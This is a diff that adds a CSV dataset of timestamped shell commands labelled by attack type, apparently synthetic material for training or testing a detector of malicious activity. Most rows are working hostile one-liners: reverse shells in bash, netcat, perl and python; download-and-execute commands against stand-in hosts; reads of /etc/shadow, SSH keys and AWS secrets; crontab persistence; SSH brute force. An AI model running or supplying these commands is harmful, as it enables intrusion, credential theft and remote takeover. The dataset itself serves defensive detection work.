@@ -1,0 +1,1001 @@
+id,timestamp,log,label
+log-1,2025-05-05T02:45:00.538585Z,uname -a; id; hostname; ifconfig -a,reconnaissance
+log-2,2025-04-21T06:27:09.538615Z,curl -fsSL http://malicious.test/runme84.php -o /tmp/runme84.php; php /tmp/runme84.php,malware_download
+log-3,2025-10-20T14:04:28.538631Z,nc -e /bin/sh 172.16.0.9 2222,reverse_shell
+log-4,2025-01-19T05:23:15.538643Z,curl http://malware.srv/payload -o /tmp/p && bash /tmp/p,malware_download
+log-5,2025-08-10T00:13:47.538654Z,ls /var/www; ls /srv; curl http://localhost:80/.env,enumeration
+log-6,2025-01-15T21:40:34.538666Z,"perl -e 'use Socket;$i=""45.23.11.9"";$p=9001;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec""/bin/sh -i"";}'",reverse_shell
+log-7,2025-11-20T16:25:18.538680Z,sshpass -p 'password' ssh ubuntu@192.0.2.12,brute_force
+log-8,2025-04-16T22:42:19.538695Z,sshpass -p 'password' ssh ubuntu@203.0.113.7,brute_force
+log-9,2025-03-30T00:35:50.538707Z,bash -i >& /dev/tcp/203.0.113.7/9001 0>&1,reverse_shell
+log-10,2025-07-31T07:45:53.538717Z,cat /etc/passwd,credential_harvest
+log-11,2025-04-19T03:47:20.538727Z,find / -name '*.conf' -type f,enumeration
+log-12,2025-05-29T22:01:31.538736Z,cp /bin/bash /tmp/.bash; chmod +x /tmp/.bash; /tmp/.bash -c '...',persistence_or_filesystem
+log-13,2025-11-07T19:08:14.538746Z,hydra -l root -P /tmp/wordlist.txt ssh://203.0.113.7,brute_force
+log-14,2025-09-13T18:15:24.538756Z,find / -name '*.conf' -type f,enumeration
+log-15,2025-03-17T11:28:08.538765Z,hydra -l root -P /tmp/wordlist.txt ssh://45.23.11.9,brute_force
+log-16,2025-11-03T02:45:48.538775Z,curl -fsSL http://evil.example/p10.php -o /tmp/p10.php; php /tmp/p10.php,malware_download
+log-17,2025-04-08T13:05:11.538784Z,find / -name '*.conf' -type f,enumeration
+log-18,2025-06-16T23:55:43.538794Z,wget http://payloads.net/runme7.sh && chmod +x runme7.sh && ./ runme7.sh,malware_download
+log-19,2025-04-24T07:52:13.538804Z,bash -i >& /dev/tcp/192.0.2.12/8080 0>&1,reverse_shell
+log-20,2025-12-05T13:41:32.538816Z,wget http://evil.example/install28.sh ; chmod +x install28.sh ; ./ install28.sh,malware_download
+log-21,2025-02-13T08:09:59.538826Z,"perl -e 'use Socket;$i=""192.0.2.12"";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec""/bin/sh -i"";}'",reverse_shell
+log-22,2025-11-02T19:20:37.538836Z,curl http://evil.example/payload -o /tmp/p ; bash /tmp/p,malware_download
+log-23,2025-08-24T16:28:05.538846Z,hydra -l root -P /tmp/wordlist.txt ssh://203.0.113.7,brute_force
+log-24,2025-04-16T05:17:29.538855Z,"perl -e 'use Socket;$i=""172.16.0.9"";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec""/bin/sh -i"";}'",reverse_shell
+log-25,2025-07-14T22:09:49.538864Z,echo 'hello world',unknown
+log-26,2025-10-09T00:00:36.538874Z,hydra -l root -P /tmp/wordlist.txt ssh://203.0.113.7,brute_force
+log-27,2025-03-31T18:45:51.538883Z,cat /etc/passwd,credential_harvest
+log-28,2025-07-25T22:01:27.538892Z,mkdir /tmp/persist82; chmod 777 /tmp/persist82,persistence_or_filesystem
+log-29,2025-02-11T07:47:25.538901Z,"grep -Ri ""password"" /home || grep -Ri ""AWS_SECRET"" /etc || cat /root/.ssh/id_rsa",credential_harvest
+log-30,2025-10-15T15:01:48.538911Z,curl -fsSL http://evil.example/x88.php -o /tmp/x88.php; php /tmp/x88.php,malware_download
+log-31,2025-06-19T12:55:01.538925Z,cat /etc/shadow,credential_harvest
+log-32,2025-04-15T15:10:35.538934Z,ss -tulpn; nmap -sT -p- localhost,enumeration
+log-33,2025-07-17T15:07:20.538943Z,bash -i >& /dev/tcp/1.2.3.4/80 0>&1,reverse_shell
+log-34,2025-10-12T06:11:12.538952Z,ls -la /; ps aux; netstat -tulpn,reconnaissance
+log-35,2024-12-09T12:01:51.538961Z,hydra -l root -P /tmp/wordlist.txt ssh://192.0.2.12,brute_force
+log-36,2025-07-01T13:02:17.538971Z,curl -fsSL http://badhost.local/runme16.php -o /tmp/runme16.php; php /tmp/runme16.php,malware_download
+log-37,2025-02-18T16:56:59.538981Z,"python -c 'import socket,subprocess,os;s=socket.socket();s.connect((""45.23.11.9"",8080));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",""-i""])'",reverse_shell
+log-38,2025-08-19T09:17:45.538991Z,sshpass -p 'admin123' ssh ec2-user@10.0.0.5,brute_force
+log-39,2025-07-01T19:43:41.539000Z,hydra -l root -P /tmp/wordlist.txt ssh://172.16.0.9,brute_force
+log-40,2024-12-15T13:55:37.539009Z,find / -name '*.conf' -type f,enumeration
+log-41,2025-03-16T10:59:36.539018Z,sshpass -p 'toor' ssh root@172.16.0.9,brute_force
+log-42,2025-04-22T22:06:44.539028Z,curl -fsSL http://evil.example/install79.php -o /tmp/install79.php; php /tmp/install79.php,malware_download
+log-43,2025-04-26T01:05:10.539037Z,cat /etc/shadow,credential_harvest
+log-44,2025-09-19T20:07:02.539046Z,cat /etc/passwd,credential_harvest
+log-45,2025-02-11T03:11:45.539056Z,"python3 -c 'import urllib.request as u;open(""/tmp/x54.py"",""wb"").write(u.urlopen(""http://badhost.local/x54.py"").read())'; python3 /tmp/x54.py",malware_download
+log-46,2025-08-16T17:58:11.539065Z,ss -tulpn; nmap -sT -p- localhost,enumeration
+log-47,2025-02-06T07:21:30.539075Z,sshpass -p 'password' ssh ec2-user@10.0.0.5,brute_force
+log-48,2025-08-20T11:21:07.539083Z,uname -a; id; hostname; ifconfig -a,reconnaissance
+log-49,2025-08-14T04:14:10.539093Z,"perl -e 'use Socket;$i=""192.0.2.12"";$p=9001;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec""/bin/sh -i"";}'",reverse_shell
+log-50,2025-08-17T10:58:33.539103Z,wget http://evil.example/x17.sh ; chmod +x x17.sh ; ./ x17.sh,malware_download
+log-51,2025-02-15T14:14:33.539112Z,cat /etc/shadow,credential_harvest
+log-52,2025-02-02T23:29:59.539122Z,bash -i >& /dev/tcp/203.0.113.7/80 0>&1,reverse_shell
+log-53,2025-05-05T10:03:34.539130Z,ss -tulpn; nmap -sT -p- localhost,enumeration
+log-54,2025-03-06T10:18:13.539140Z,curl http://payloads.net/payload -o /tmp/p && bash /tmp/p,malware_download
+log-55,2025-04-13T07:09:34.539149Z,hydra -l root -P /tmp/wordlist.txt ssh://10.0.0.5,brute_force
+log-56,2025-06-15T17:43:30.539158Z,ls -la /; ps aux; netstat -tulpn,reconnaissance
+log-57,2025-02-25T19:09:26.539166Z,ss -tulpn; nmap -sT -p- localhost,enumeration
+log-58,2025-08-04T16:45:30.539175Z,"grep -Ri ""password"" /home || grep -Ri ""AWS_SECRET"" /etc || cat /root/.ssh/id_rsa",credential_harvest
+log-59,2024-12-12T11:23:12.539184Z,ls -la /; ps aux; netstat -tulpn,reconnaissance
+log-60,2025-08-18T10:16:41.539195Z,"python -c 'import socket,subprocess,os;s=socket.socket();s.connect((""1.2.3.4"",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",""-i""])'",reverse_shell
+log-61,2025-03-08T23:17:54.539205Z,"python -c 'import socket,subprocess,os;s=socket.socket();s.connect((""45.23.11.9"",9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",""-i""])'",reverse_shell
+log-62,2025-04-05T11:52:12.539214Z,nc -e /bin/sh 10.0.0.5 80,reverse_shell
+log-63,2025-09-21T07:24:53.539224Z,nc -e /bin/sh 192.0.2.12 4444,reverse_shell
+log-64,2025-07-07T06:28:46.539234Z,mkdir /tmp/backdoor57; chmod 777 /tmp/backdoor57,persistence_or_filesystem
+log-65,2025-10-26T22:11:20.539243Z,date; whoami,unknown
+log-66,2024-12-10T17:36:49.539252Z,nc -e /bin/sh 1.2.3.4 2222,reverse_shell
+log-67,2025-09-21T18:14:09.539260Z,cat /etc/shadow,credential_harvest
+log-68,2025-07-04T13:15:08.539269Z,find / -name '*.conf' -type f,enumeration
+log-69,2025-08-01T02:57:55.539279Z,cp /bin/bash /tmp/.bash; chmod +x /tmp/.bash; /tmp/.bash -c '...',persistence_or_filesystem
+log-70,2025-02-10T12:02:13.539289Z,wget http://badhost.local/payload84.sh ; chmod +x payload84.sh ; ./ payload84.sh,malware_download
+log-71,2025-06-21T12:55:10.539298Z,ls -la /; ps aux; netstat -tulpn,reconnaissance
+log-72,2025-05-14T09:10:16.539307Z,cat /etc/shadow,credential_harvest
+log-73,2025-04-25T02:01:41.539315Z,find / -name '*.conf' -type f,enumeration
+log-74,2025-09-16T16:35:35.539326Z,curl -fsSL http://badhost.local/p81.php -o /tmp/p81.php; php /tmp/p81.php,malware_download
+log-75,2025-07-10T09:22:47.539335Z,cat /etc/issue; uname -r; dpkg -l | grep openssh,reconnaissance
+log-76,2025-07-18T12:47:58.539344Z,cat /etc/shadow,credential_harvest
+log-77,2025-06-19T07:48:45.539354Z,"python -c 'import socket,subprocess,os;s=socket.socket();s.connect((""10.0.0.5"",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",""-i""])'",reverse_shell
+log-78,2025-11-14T16:19:21.539362Z,cat /etc/shadow,credential_harvest
+log-79,2025-04-26T00:16:36.539372Z,"grep -Ri ""password"" /home || grep -Ri ""AWS_SECRET"" /etc || cat /root/.ssh/id_rsa",credential_harvest
+log-80,2025-01-21T13:26:07.539381Z,for i in {1..1000}; do ssh root@172.16.0.9 -p 8080 -o ConnectTimeout=2 -o BatchMode=no; done,brute_force
+log-81,2024-12-21T17:26:38.539391Z,ls -la /; ps aux; netstat -tulpn,reconnaissance
+log-82,2025-11-13T16:05:49.539400Z,some-weird-tool --foo bar,unknown
+log-83,2025-09-09T01:01:55.539408Z,ls /var/www; ls /srv; curl http://localhost:80/.env,enumeration
+log-84,2025-07-30T03:33:54.539417Z,ls -la /; ps aux; netstat -tulpn,reconnaissance
+log-85,2025-05-03T18:48:05.539427Z,echo '@reboot root /tmp/install45.sh' >> /etc/crontab,persistence_or_filesystem
+log-86,2025-07-08T17:09:29.539436Z,for i in {1..1000}; do ssh root@192.0.2.12 -p 443 -o ConnectTimeout=2 -o BatchMode=no; done,brute_force
+log-87,2025-01-15T20:59:05.539447Z,"python3 -c 'import urllib.request as u;open(""/tmp/update30.py"",""wb"").write(u.urlopen(""http://badhost.local/update30.py"").read())'; python3 /tmp/update30.py",malware_download
+log-88,2025-10-01T00:37:32.539456Z,cat /etc/issue; uname -r; dpkg -l | grep openssh,reconnaissance
+log-89,2025-07-28T10:21:49.539466Z,echo '@reboot root /tmp/payload65.sh' >> /etc/crontab,persistence_or_filesystem
+log-90,2025-06-03T00:37:09.539475Z,echo '@reboot root /tmp/x87.sh' >> /etc/crontab,persistence_or_filesystem
+log-91,2025-05-25T04:39:30.539484Z,find / -name '*.conf' -type f,enumeration
+log-92,2025-07-05T04:16:08.539493Z,mkdir /tmp/backdoor90; chmod 777 /tmp/backdoor90,persistence_or_filesystem
+log-93,2025-04-18T14:23:56.539503Z,sshpass -p 'toor' ssh ec2-user@1.2.3.4,brute_force
+log-94,2025-05-12T17:43:19.539512Z,"grep -Ri ""password"" /home || grep -Ri ""AWS_SECRET"" /etc || cat /root/.ssh/id_rsa",credential_harvest
+log-95,2025-01-10T14:50:53.539521Z,curl http://malicious.test/payload -o /tmp/p && bash /tmp/p,malware_download
+log-96,2025-08-04T23:19:20.539531Z,curl http://malicious.test/payload -o /tmp/p && bash /tmp/p,malware_download
+log-97,2025-09-23T23:10:27.539539Z,cat /etc/passwd,credential_harvest
+log-98,2025-06-25T03:19:57.539549Z,sshpass -p 'password' ssh root@172.16.0.9,brute_force
+log-99,2025-04-19T09:33:46.539558Z,wget http://malicious.test/install58.sh && chmod +x install58.sh && ./ install58.sh,malware_download
+log-100,2025-10-12T10:03:25.539567Z,nc -e /bin/sh 10.0.0.5 2222,reverse_shell
+log-101,2025-02-04T08:35:24.539576Z,cat /etc/shadow,credential_harvest
+log-102,2025-04-18T13:23:23.539587Z,"perl -e 'use Socket;$i=""172.16.0.9"";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec""/bin/sh -i"";}'",reverse_shell
+log-103,2025-10-22T00:47:57.539596Z,sshpass -p 'admin123' ssh ubuntu@192.0.2.12,brute_force
+log-104,2025-05-05T02:02:02.539606Z,wget http://badhost.local/runme16.sh && chmod +x runme16.sh && ./ runme16.sh,malware_download
+log-105,2025-06-10T07:39:15.539615Z,cp /bin/bash /tmp/.bash; chmod +x /tmp/.bash; /tmp/.bash -c '...',persistence_or_filesystem
+log-106,2025-09-05T17:57:27.539625Z,"python -c 'import socket,subprocess,os;s=socket.socket();s.connect((""45.23.11.9"",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",""-i""])'",reverse_shell
+log-107,2025-09-25T04:51:14.539633Z,cat /etc/shadow,credential_harvest
+log-108,2025-06-23T07:14:30.539642Z,echo 'hello world',unknown
+log-109,2025-01-30T11:48:46.539651Z,uname -a; id; hostname; ifconfig -a,reconnaissance
+log-110,2024-12-30T16:40:40.539660Z,sshpass -p 'toor' ssh ec2-user@1.2.3.4,brute_force
+log-111,2025-07-29T17:22:07.539670Z,"python3 -c 'import urllib.request as u;open(""/tmp/x99.py"",""wb"").write(u.urlopen(""http://malware.srv/x99.py"").read())'; python3 /tmp/x99.py",malware_download
+log-112,2025-02-23T15:00:44.539679Z,nc -e /bin/sh 172.16.0.9 2222,reverse_shell
+log-113,2025-07-11T23:42:49.539689Z,wget http://payloads.net/payload55.sh && chmod +x payload55.sh && ./ payload55.sh,malware_download
+log-114,2025-02-08T13:19:38.539699Z,for i in {1..1000}; do ssh root@203.0.113.7 -p 2222 -o ConnectTimeout=2 -o BatchMode=no; done,brute_force
+log-115,2025-03-20T20:50:50.539709Z,for i in {1..1000}; do ssh root@172.16.0.9 -p 9001 -o ConnectTimeout=2 -o BatchMode=no; done,brute_force
+log-116,2025-09-09T05:58:28.539718Z,echo '@reboot root /tmp/p19.sh' >> /etc/crontab,persistence_or_filesystem
+log-117,2025-04-26T01:25:15.539728Z,wget http://malicious.test/runme73.sh && chmod +x runme73.sh && ./ runme73.sh,malware_download
+log-118,2025-04-20T02:32:16.539737Z,hydra -l root -P /tmp/wordlist.txt ssh://10.0.0.5,brute_force
+log-119,2025-02-17T04:10:28.539747Z,curl http://evil.example/payload -o /tmp/p && bash /tmp/p,malware_download
+log-120,2025-01-10T21:37:28.539757Z,"python3 -c 'import urllib.request as u;open(""/tmp/update92.py"",""wb"").write(u.urlopen(""http://malware.srv/update92.py"").read())'; python3 /tmp/update92.py",malware_download
+log-121,2025-06-16T06:08:19.539767Z,"python3 -c 'import urllib.request as u;open(""/tmp/update37.py"",""wb"").write(u.urlopen(""http://payloads.net/update37.py"").read())'; python3 /tmp/update37.py",malware_download
+log-122,2025-01-01T22:45:28.539777Z,curl http://evil.example/payload -o /tmp/p ; bash /tmp/p,malware_download
+log-123,2024-12-28T08:44:30.539786Z,echo '@reboot root /tmp/payload49.sh' >> /etc/crontab,persistence_or_filesystem
+log-124,2025-04-02T20:54:59.539796Z,"python3 -c 'import urllib.request as u;open(""/tmp/x28.py"",""wb"").write(u.urlopen(""http://malware.srv/x28.py"").read())'; python3 /tmp/x28.py",malware_download
+log-125,2025-05-28T22:17:27.539805Z,bash -i >& /dev/tcp/1.2.3.4/9001 0>&1,reverse_shell
+log-126,2025-04-21T19:23:14.539815Z,curl -fsSL http://payloads.net/install79.php -o /tmp/install79.php; php /tmp/install79.php,malware_download
+log-127,2025-08-26T05:53:31.539825Z,for i in {1..1000}; do ssh root@45.23.11.9 -p 9001 -o ConnectTimeout=2 -o BatchMode=no; done,brute_force
+log-128,2025-09-15T17:58:30.539834Z,curl http://evil.example/payload -o /tmp/p ; bash /tmp/p,malware_download
+log-129,2025-05-18T09:37:46.539843Z,hydra -l root -P /tmp/wordlist.txt ssh://192.0.2.12,brute_force
+log-130,2025-09-28T02:30:45.539853Z,"perl -e 'use Socket;$i=""10.0.0.5"";$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec""/bin/sh -i"";}'",reverse_shell
+log-131,2025-09-21T07:55:33.539863Z,"perl -e 'use Socket;$i=""172.16.0.9"";$p=2222;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec""/bin/sh -i"";}'",reverse_shell
+log-132,2025-05-06T04:38:37.539871Z,cp /bin/bash /tmp/.bash; chmod +x /tmp/.bash; /tmp/.bash -c '...',persistence_or_filesystem
+log-133,2025-09-24T17:18:08.539880Z,ls /var/www; ls /srv; curl http://localhost:80/.env,enumeration
+log-134,2025-06-06T01:26:35.539889Z,hydra -l root -P /tmp/wordlist.txt ssh://45.23.11.9,brute_force
+log-135,2025-07-31T03:18:57.539898Z,cp /bin/bash /tmp/.bash; chmod +x /tmp/.bash; /tmp/.bash -c '...',persistence_or_filesystem
+log-136,2025-06-16T04:30:13.539907Z,nc -e /bin/sh 45.23.11.9 80,reverse_shell
+log-137,2025-08-26T02:18:44.539916Z,"python3 -c 'import urllib.request as u;open(""/tmp/runme59.py"",""wb"").write(u.urlopen(""http://payloads.net/runme59.py"").read())'; python3 /tmp/runme59.py",malware_download
+log-138,2025-06-08T02:10:00.539925Z,find / -name '*.conf' -type f,enumeration
+log-139,2025-06-16T21:06:19.539935Z,ls /var/www; ls /srv; curl http://localhost:80/.env,enumeration
+log-140,2025-07-09T16:12:44.539944Z,for i in {1..1000}; do ssh root@203.0.113.7 -p 9001 -o ConnectTimeout=2 -o BatchMode=no; done,brute_force
+log-141,2025-06-09T05:31:16.539954Z,curl http://badhost.local/payload -o /tmp/p ; bash /tmp/p,malware_download
+log-142,2025-09-24T05:47:10.539963Z,date; whoami,unknown
+log-143,2025-09-19T11:31:33.539972Z,cat /etc/shadow,credential_harvest
+log-144,2025-10-10T02:57:49.539981Z,echo '@reboot root /tmp/install41.sh' >> /etc/crontab,persistence_or_filesystem
+log-145,2025-01-27T17:30:34.539989Z,cat /etc/shadow,credential_harvest
+log-146,2024-12-22T16:16:16.539998Z,cat /etc/shadow,credential_harvest
+log-147,2025-03-21T19:44:34.540007Z,cat /etc/issue; uname -r; dpkg -l | grep openssh,reconnaissance
+log-148,2025-02-27T23:10:56.540017Z,curl -fsSL http://malicious.test/update71.php -o /tmp/update71.php; php /tmp/update71.php,malware_download
+log-149,2025-06-27T04:31:13.540026Z,uname -a; id; hostname; ifconfig -a,reconnaissance
+log-150,2025-03-16T22:20:09.540037Z,"python3 -c 'import urllib.request as u;open(""/tmp/install65.py"",""wb"").write(u.urlopen(""http://malware.srv/install65.py"").read())'; python3 /tmp/install65.py",malware_download
+log-151,2025-02-27T17:54:53.540046Z,bash -i >& /dev/tcp/172.16.0.9/8080 0>&1,reverse_shell
+log-152,2025-11-23T00:56:59.540056Z,curl http://malware.srv/payload -o /tmp/p ; bash /tmp/p,malware_download
+log-153,2025-04-03T18:59:29.540065Z,curl http://malicious.test/payload -o /tmp/p && bash /tmp/p,malware_download
+log-154,2025-04-13T20:28:44.540073Z,ss -tulpn; nmap -sT -p- localhost,enumeration
+log-155,2025-02-23T00:02:28.540083Z,bash -i >& /dev/tcp/172.16.0.9/9001 0>&1,reverse_shell
+log-156,2025-01-25T12:41:00.540092Z,"perl -e 'use Socket;$i=""10.0.0.5"";$p=2222;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec""/bin/sh -i"";}'",reverse_shell
+log-157,2025-07-02T09:47:54.540101Z,bash -i >& /dev/tcp/203.0.113.7/80 0>&1,reverse_shell
+log-158,2025-02-04T04:05:10.540111Z,"python3 -c 'import urllib.request as u;open(""/tmp/p7.py"",""wb"").write(u.urlopen(""http://malware.srv/p7.py"").read())'; python3 /tmp/p7.py",malware_download
+log-159,2025-05-14T14:35:01.540120Z,cat /etc/shadow,credential_harvest
+log-160,2025-01-21T05:39:35.540130Z,wget http://malware.srv/p50.sh && chmod +x p50.sh && ./ p50.sh,malware_download
+log-161,2025-11-17T22:55:04.540140Z,wget http://payloads.net/x26.sh ; chmod +x x26.sh ; ./ x26.sh,malware_download
+log-162,2025-01-25T17:00:44.540149Z,cat /etc/shadow,credential_harvest
+log-163,2025-10-11T12:44:29.540157Z,cat /etc/issue; uname -r; dpkg -l | grep openssh,reconnaissance
+log-164,2025-03-13T05:00:18.540166Z,cat /etc/issue; uname -r; dpkg -l | grep openssh,reconnaissance
+log-165,2025-05-06T22:23:37.540175Z,cat /etc/shadow,credential_harvest
+log-166,2025-06-23T10:29:24.540185Z,sshpass -p 'toor' ssh ec2-user@203.0.113.7,brute_force
+log-167,2025-04-03T20:54:25.540195Z,for i in {1..1000}; do ssh root@192.0.2.12 -p 6666 -o ConnectTimeout=2 -o BatchMode=no; done,brute_force
+log-168,2025-04-05T15:12:27.540204Z,echo '@reboot root /tmp/runme27.sh' >> /etc/crontab,persistence_or_filesystem
+log-169,2025-11-15T17:26:05.540212Z,cat /etc/issue; uname -r; dpkg -l | grep openssh,reconnaissance
+log-170,2024-12-15T18:01:04.540221Z,mkdir /tmp/xdata72; chmod 777 /tmp/xdata72,persistence_or_filesystem
+log-171,2025-04-10T00:14:47.540232Z,curl -fsSL http://malicious.test/p13.php -o /tmp/p13.php; php /tmp/p13.php,malware_download
+log-172,2025-07-12T16:12:49.540240Z,cat /etc/passwd,credential_harvest
+log-173,2025-05-17T09:52:15.540249Z,nc -e /bin/sh 172.16.0.9 6666,reverse_shell
+log-174,2025-04-11T17:58:24.540259Z,curl http://evil.example/payload -o /tmp/p && bash /tmp/p,malware_download
+log-175,2025-07-08T07:14:05.540270Z,wget http://badhost.local/runme24.sh && chmod +x runme24.sh && ./ runme24.sh,malware_download
+log-176,2024-12-30T00:26:03.540279Z,cat /etc/passwd,credential_harvest
+log-177,2025-07-23T15:54:21.540288Z,curl -fsSL http://payloads.net/install31.php -o /tmp/install31.php; php /tmp/install31.php,malware_download
+log-178,2025-09-16T13:08:47.540298Z,nc -e /bin/sh 172.16.0.9 9001,reverse_shell
+log-179,2025-04-06T22:19:47.540307Z,"grep -Ri ""password"" /home || grep -Ri ""AWS_SECRET"" /etc || cat /root/.ssh/id_rsa",credential_harvest
+log-180,2025-04-22T08:40:37.540316Z,hydra -l root -P /tmp/wordlist.txt ssh://192.0.2.12,brute_force
+log-181,2024-12-23T20:25:43.540324Z,cat /etc/passwd,credential_harvest
+log-182,2025-02-22T01:48:18.540333Z,cat /etc/shadow,credential_harvest
+log-183,2025-10-31T02:15:29.540341Z,cat /etc/issue; uname -r; dpkg -l | grep openssh,reconnaissance
+log-184,2025-09-28T04:33:00.540350Z,hydra -l root -P /tmp/wordlist.txt ssh://203.0.113.7,brute_force
+log-185,2025-06-11T23:35:16.540359Z,some-weird-tool --foo bar,unknown
+log-186,2025-03-03T12:27:54.540369Z,"python3 -c 'import urllib.request as u;open(""/tmp/p39.py"",""wb"").write(u.urlopen(""http://malware.srv/p39.py"").read())'; python3 /tmp/p39.py",malware_download
+log-187,2025-01-02T12:38:35.540378Z,sshpass -p 'admin123' ssh admin@192.0.2.12,brute_force
+log-188,2025-11-14T13:15:40.540387Z,uname -a; id; hostname; ifconfig -a,reconnaissance
+log-189,2025-02-03T16:13:55.540396Z,hydra -l root -P /tmp/wordlist.txt ssh://1.2.3.4,brute_force
+log-190,2024-12-24T12:21:11.540405Z,bash -i >& /dev/tcp/45.23.11.9/2222 0>&1,reverse_shell
+log-191,2025-07-06T14:12:02.540414Z,uname -a; id; hostname; ifconfig -a,reconnaissance
+log-192,2025-02-24T08:36:38.540424Z,"python3 -c 'import urllib.request as u;open(""/tmp/p72.py"",""wb"").write(u.urlopen(""http://malicious.test/p72.py"").read())'; python3 /tmp/p72.py",malware_download
+log-193,2025-07-22T14:10:29.540433Z,curl -fsSL http://badhost.local/update12.php -o /tmp/update12.php; php /tmp/update12.php,malware_download
+log-194,2025-08-20T20:59:19.540442Z,"grep -Ri ""password"" /home || grep -Ri ""AWS_SECRET"" /etc || cat /root/.ssh/id_rsa",credential_harvest
+log-195,2025-05-26T10:55:53.540452Z,mkdir /tmp/xdata37; chmod 777 /tmp/xdata37,persistence_or_filesystem
+log-196,2025-06-26T20:30:41.540461Z,for i in {1..1000}; do ssh root@10.0.0.5 -p 9001 -o ConnectTimeout=2 -o BatchMode=no; done,brute_force
+log-197,2025-09-19T20:45:50.540470Z,"perl -e 'use Socket;$i=""203.0.113.7"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec""/bin/sh -i"";}'",reverse_shell
+log-198,2025-09-11T15:05:05.540480Z,"perl -e 'use Socket;$i=""45.23.11.9"";$p=2222;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec""/bin/sh -i"";}'",reverse_shell
+log-199,2025-12-03T12:53:32.540490Z,"python3 -c 'import urllib.request as u;open(""/tmp/p86.py"",""wb"").write(u.urlopen(""http://malicious.test/p86.py"").read())'; python3 /tmp/p86.py",malware_download
+log-200,2025-01-24T04:41:17.540500Z,curl -fsSL http://evil.example/payload59.php -o /tmp/payload59.php; php /tmp/payload59.php,malware_download
+log-201,2025-11-28T08:37:54.540509Z,cat /etc/issue; uname -r; dpkg -l | grep openssh,reconnaissance
+log-202,2025-08-30T05:20:30.540518Z,"grep -Ri ""password"" /home || grep -Ri ""AWS_SECRET"" /etc || cat /root/.ssh/id_rsa",credential_harvest
+log-203,2025-08-13T16:59:07.540527Z,for i in {1..1000}; do ssh root@192.0.2.12 -p 4444 -o ConnectTimeout=2 -o BatchMode=no; done,brute_force
+log-204,2025-12-02T21:40:02.540536Z,cat /etc/passwd,credential_harvest
+log-205,2025-11-14T01:12:01.540546Z,"python3 -c 'import urllib.request as u;open(""/tmp/x28.py"",""wb"").write(u.urlopen(""http://badhost.local/x28.py"").read())'; python3 /tmp/x28.py",malware_download
+log-206,2025-09-24T13:24:20.540555Z,cat /etc/shadow,credential_harvest
+log-207,2025-10-27T09:40:26.540566Z,echo '@reboot root /tmp/install97.sh' >> /etc/crontab,persistence_or_filesystem
+log-208,2025-11-21T04:49:10.540575Z,cat /etc/shadow,credential_harvest
+log-209,2025-01-24T17:09:10.540584Z,"perl -e 'use Socket;$i=""45.23.11.9"";$p=9001;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec""/bin/sh -i"";}'",reverse_shell
+log-210,2025-05-21T16:22:38.540593Z,ss -tulpn; nmap -sT -p- localhost,enumeration
+log-211,2025-04-30T11:33:55.540602Z,nc -e /bin/sh 10.0.0.5 2222,reverse_shell
+log-212,2025-11-30T17:16:52.540610Z,cat /etc/issue; uname -r; dpkg -l | grep openssh,reconnaissance
+log-213,2025-07-22T09:57:11.540620Z,sshpass -p '123456' ssh admin@45.23.11.9,brute_force
+log-214,2025-01-20T09:51:20.540629Z,curl -fsSL http://payloads.net/p47.php -o /tmp/p47.php; php /tmp/p47.php,malware_download
+log-215,2025-04-25T15:43:11.540638Z,uname -a; id; hostname; ifconfig -a,reconnaissance
+log-216,2025-06-26T17:17:45.540647Z,hydra -l root -P /tmp/wordlist.txt ssh://45.23.11.9,brute_force
+log-217,2025-10-09T07:22:40.540655Z,"grep -Ri ""password"" /home || grep -Ri ""AWS_SECRET"" /etc || cat /root/.ssh/id_rsa",credential_harvest
+log-218,2024-12-27T09:43:41.540665Z,curl -fsSL http://malware.srv/install38.php -o /tmp/install38.php; php /tmp/install38.php,malware_download
+log-219,2025-05-15T08:27:05.540675Z,curl http://malicious.test/payload -o /tmp/p && bash /tmp/p,malware_download
